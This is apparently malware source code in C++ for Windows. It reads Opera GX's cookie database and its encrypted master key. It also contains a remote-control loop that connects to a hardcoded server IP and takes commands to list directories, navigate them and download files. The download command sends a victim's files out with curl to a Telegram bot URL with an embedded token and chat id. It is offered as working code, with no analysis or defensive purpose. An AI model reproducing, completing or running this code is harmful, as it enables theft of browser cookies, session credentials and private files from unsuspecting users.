#include <string>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <vector>
#include <windows.h>
#include "single_include/nlohmann/json.hpp"

//#include "cookie_decryptor.h"
#include "sqlite3.h"

//pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "Ws2_32.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;
using namespace std;


std::string join(std::vector<std::string> vec, char symb)
{
    std::string out;

    for (auto str : vec)
    {
        out += str + '/';
    }

    return out;
}

std::vector<std::string> split(std::string path)
{
    std::vector<std::string> out;
    std::string buff;
    std::string last_symb;
    int iter = 0;

    for (auto symb : path)
    {
        if (symb == '/')
        {
            out.push_back(buff);
            buff = "";
            ++iter;
            continue;
        }
        buff.push_back(symb);
        last_symb = buff;
    }

    if (iter < 1) out.push_back(last_symb);

    return out;
}

std::string cp1251_to_utf8(const char* str) {
    std::string res;
    int result_u, result_c;
    result_u = MultiByteToWideChar(1251, 0, str, -1, 0, 0);
    if (!result_u) { return 0; }
    wchar_t* ures = new wchar_t[result_u];
    if (!MultiByteToWideChar(1251, 0, str, -1, ures, result_u)) {
        delete[] ures;
        return 0;
    }
    result_c = WideCharToMultiByte(65001, 0, ures, -1, 0, 0, 0, 0);
    if (!result_c) {
        delete[] ures;
        return 0;
    }
    char* cres = new char[result_c];
    if (!WideCharToMultiByte(65001, 0, ures, -1, cres, result_c, 0, 0)) {
        delete[] cres;
        return 0;
    }
    delete[] ures;
    res.append(cres);
    delete[] cres;
    return res;
}

class Reader
{

public:
    std::vector<std::string> path;
    Reader(std::vector<std::string> p_path)
    {
        path = p_path;
    }

    int go_to(json &j, std::string p_path, bool go_up)
    {
        std::string formatted_str;
        if (go_up)
        {
            path.pop_back();
            formatted_str = join(path, '/');
        }
        else
        {
            formatted_str = join(path, '/');
            formatted_str += p_path;
        }

        path = split(formatted_str);

        std::cout << join(path, '/') << std::endl;

        std::cout << "[FILES IN " << formatted_str << "]" << '\n';

        std::vector<std::string> resp;
        int c = 0;

        try
        {
            for (const auto& entry : fs::directory_iterator(formatted_str))
            {
                j[std::to_string(c)] = cp1251_to_utf8(entry.path().string().c_str());
                ++c;
            }

        }
        catch (const std::exception& err)
        {
            std::cout << err.what() << '\n';
            path.pop_back();
        }


        return 1;
    }

    void get_now(json& j)
    {
        std::string dir = join(path, '/');
        std::cout << dir;
        std::vector<std::string> resp;
        int c = 0;
        try
        {
            for (const auto& entry : fs::directory_iterator(dir))
            {
                j[std::to_string(c)] = cp1251_to_utf8(entry.path().string().c_str());
                ++c;
            }

        }
        catch (const std::exception& err)
        {
            std::cout << err.what() << " this " << std::endl;
        }
        std::cout << j << std::endl;
    }
};


static int callback(void* NotUsed, int argc, char** argv, char** azColName) {
       int i;
       for (i = 0; i < argc; i++) {
              printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
        
    }
       printf("\n");
        return 0;
    
}


int main(int argc, char** argv)
{
    string cookie_path = "C:\\Users\\empty\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies";
    string encrypted_master_key_path = "C:\\Users\\empty\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";

    std::vector<char> data(13000);
    ifstream readen_mk(encrypted_master_key_path, ios_base::in);
    readen_mk.read(data.data(), 13000);
    readen_mk.close();

    string reformat;

    for (char str : data) reformat.push_back(str);
    cout << reformat.length();

    return 1;

    sqlite3* db = 0; // хэндл объекта соединение к БД
    char* zErrMsg = 0;
    int res;
    res = sqlite3_open(cookie_path.c_str(), &db);
    string execute_command = "SELECT name, value from cookies;";
    sqlite3_exec(db, execute_command.c_str(), callback, 0, &zErrMsg);
//    cout << zErrMsg;
}

int f(){
    setlocale(LC_ALL, "Russian");
    std::vector<std::string> path = split("D:/");
    Reader reader(path);
    WSADATA wsData;

    int erStat = WSAStartup(MAKEWORD(2, 2), &wsData);

    if (erStat != 0) {
        std::cout << "Error WinSock version initializaion #";
        std::cout << WSAGetLastError();
        return 1;
    }
    else
        std::cout << "WinSock initialization is OK" << std::endl;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in servInfo;
    in_addr ip_to_num;
    inet_pton(AF_INET, "91.203.193.10", &ip_to_num);

    char str[INET_ADDRSTRLEN];

    ZeroMemory(&servInfo, sizeof(servInfo));
    servInfo.sin_family = AF_INET;

    servInfo.sin_addr = ip_to_num;
    servInfo.sin_port = htons(8081);

    auto r = connect(sock, (sockaddr*)&servInfo, sizeof(servInfo));

    if (r != 0)
    {
        std::cout << "Connection to Server is FAILED. Error # " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    else
        std::cout << "Connection established SUCCESSFULLY. Ready to send a message to Server" << std::endl;


    std::string s(R"({"type": "BEGIN"})");
    std::string get_task(R"({"type": "GET_TASK"})");

    send(sock, s.c_str(), s.size(), 0);


    Sleep(1);

    char buf[1024];

    while (true)
    {
        
        auto res = send(sock, get_task.c_str(), get_task.size(), 0);
        Sleep(1000);
        recv(sock, buf, 1024, 0);
        std::cout << buf << std::endl;

        try
        {
            json response = json::parse(buf);
            std::string task = response["type"];
            
            if (task == "GET_DIR")
            {
                json response_answer;
                response_answer["type"] = "RETURN_DIR";
                printf("1\n");
                reader.get_now(response_answer);
                printf("12\n");
                auto data = response_answer.dump();
                std::cout << data.length() << '\t' << data.size();
                send(sock, data.c_str(), data.size(), 0);
            }
            else if (task == "GO_TO")
            {
                json response_answer;
                response_answer["type"] = "RETURN_GO_TO";
                std::string dir = response["dir"];
                if (dir == "../") reader.go_to(response_answer, dir, true);
                else reader.go_to(response_answer, dir + '/', false);
                auto data = response_answer.dump();
                for (auto i : response_answer) std::cout << i << std::endl;
                send(sock, data.c_str(), data.size(), 0);
            }
            else if (task == "DOWNLOAD")
            {
                std::string filename = response["filename"];
                std::string formatted_path =  join(reader.path, '/') + cp1251_to_utf8(filename.c_str());
                std::string command = std::format("curl -F document=@{0} https://api.telegram.org/bot6093837067:AAEx_TxQF6ieI_NIur-bAgXIGGzBIWe29mo/sendDocument?chat_id=6134274211", formatted_path);
                system(command.c_str());
            }

            std::cout << response["type"] << std::endl;
        }
        catch (std::exception& e)
        {
            std::cout << " this2 " << e.what() << std::endl;
        }
        memset(buf, 0, 1024);
    }
}